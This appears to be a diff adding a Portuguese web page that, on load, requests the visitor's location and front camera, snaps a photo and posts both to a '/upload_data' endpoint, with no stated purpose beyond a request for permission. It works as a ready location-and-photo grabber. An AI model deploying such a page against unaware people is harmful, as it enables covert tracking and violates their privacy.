@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Obter Localização e Imagem</title>
+</head>
+<body>
+    <h1>Permita o acesso à sua localização e câmera</h1>
+
+    <script>
+        async function captureData() {
+            try {
+                // Obter localização
+                const locationPromise = new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject);
+                });
+
+                const position = await locationPromise;
+                const location = {
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                };
+
+                // Acessar câmera frontal e capturar imagem
+                const video = document.createElement("video");
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                video.srcObject = stream;
+                await video.play();
+
+                // Capturar foto
+                const canvas = document.createElement("canvas");
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const context = canvas.getContext("2d");
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const image = canvas.toDataURL("image/png");
+
+                // Enviar dados ao servidor
+                const response = await fetch('/upload_data', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ location, image })
+                });
+
+                if (response.ok) {
+                    alert("Dados enviados com sucesso!");
+                }
+
+                stream.getTracks().forEach(track => track.stop());
+            } catch (error) {
+                console.error("Erro ao capturar dados:", error);
+            }
+        }
+
+        captureData();
+    </script>
+</body>
+</html>
